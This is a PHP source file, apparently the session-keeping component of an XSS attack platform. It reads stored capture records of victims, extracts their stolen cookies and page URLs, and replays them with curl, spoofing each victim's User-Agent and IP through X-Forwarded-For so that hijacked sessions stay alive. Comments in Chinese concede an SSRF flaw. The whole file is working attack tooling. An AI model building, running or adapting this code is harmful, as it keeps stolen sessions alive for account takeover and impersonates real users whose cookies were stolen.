<?php
define('IN_XSS_PLATFORM', true);
//很明显，keepsession有SSRF问题，一定要做好网络隔离，或者自己加固一下代码

ignore_user_abort();
//Windows平台最好别设成0，因为windows上lock没法实现非阻塞
set_time_limit(0);

require_once('load.php');
require_once('functions.php');
require_once('dio.php');

if (KEEP_SESSION) {
    //利用非阻塞的flock实现单例运行
    $pid = fopen(DATA_PATH . '/check.pid', "w");
    if (!$pid)
        exit();
    
    if (flock($pid, LOCK_EX | LOCK_NB)) {
        $files = glob(DATA_PATH . '/*.php');
        foreach ($files as $file) {
            $filename = basename($file, ".php");
            $info     = load_xss_record($filename);
            if ($info['keepsession'] === true) {
                $url    = getLocation($info);
                $cookie = getCookie($info);
                
                $useragent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2535.0 Safari/537.36';
                if (isset($info['headers_data']['User-Agent']))
                    $useragent = $info['headers_data']['User-Agent'];
                
                $ip = $info['user_IP'];
                if ($url != "" && $cookie != "") {
                    $ch       = curl_init();
                    $header[] = 'User-Agent: ' . $useragent;
                    $header[] = 'Cookie: ' . $cookie;
                    $header[] = 'X-Forwarded-For: ' . $ip;
                    
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    //https不校验证书，按需开启吧
                    //curl_setopt ( $curl_handle, CURLOPT_SSL_VERIFYHOST, 0 );
                    
                    curl_exec($ch);
                    curl_close($ch);
                }
            }
            
        }
        
        //可加上sleep来防止keepsession被ddos    
        //sleep(10);
        flock($pid, LOCK_UN);
    }
    
    fclose($pid);
    
}

function getCookie($info)
{
    $cookie = '';
    
    if (isset($info['decoded_get_data']['cookie']) && $info['decoded_get_data']['cookie'] != "")
        $cookie = $info['decoded_get_data']['cookie'];
    else if (isset($info['get_data']['cookie']) && $info['get_data']['cookie'] != "")
        $cookie = $info['get_data']['cookie'];
    else if (isset($info['decoded_post_data']['cookie']) && $info['decoded_post_data']['cookie'] != "")
        $cookie = $info['decoded_post_data']['cookie'];
    else if (isset($info['post_data']['cookie']) && $info['post_data']['cookie'] != "")
        $cookie = $info['post_data']['cookie'];
    else if (isset($info['decoded_cookie_data']['cookie']) && $info['decoded_cookie_data']['cookie'] != "")
        $cookie = $info['decoded_cookie_data']['cookie'];
    else if (isset($info['cookie_data']['cookie']) && $info['cookie_data']['cookie'] != "")
        $cookie = $info['cookie_data']['cookie'];
    
    return htmlspecialchars_decode($cookie, ENT_QUOTES);
    
}

function getLocation($info)
{
    $location = '';
    
    if (isset($info['decoded_get_data']['location']) && $info['decoded_get_data']['location'] != "")
        $location = $info['decoded_get_data']['location'];
    else if (isset($info['get_data']['location']) && $info['get_data']['location'] != "")
        $location = $info['get_data']['location'];
    else if (isset($info['decoded_post_data']['location']) && $info['decoded_post_data']['location'] != "")
        $location = $info['decoded_post_data']['location'];
    else if (isset($info['post_data']['location']) && $info['post_data']['location'] != "")
        $location = $info['post_data']['location'];
    else if (isset($info['decoded_cookie_data']['location']) && $info['decoded_cookie_data']['location'] != "")
        $location = $info['decoded_cookie_data']['location'];
    else if (isset($info['cookie_data']['location']) && $info['cookie_data']['location'] != "")
        $location = $info['cookie_data']['location'];
    else if (isset($info['headers_data']['Referer']) && $info['headers_data']['Referer'] != "")
        $location = $info['headers_data']['Referer'];
    
    return htmlspecialchars_decode($location, ENT_QUOTES);
}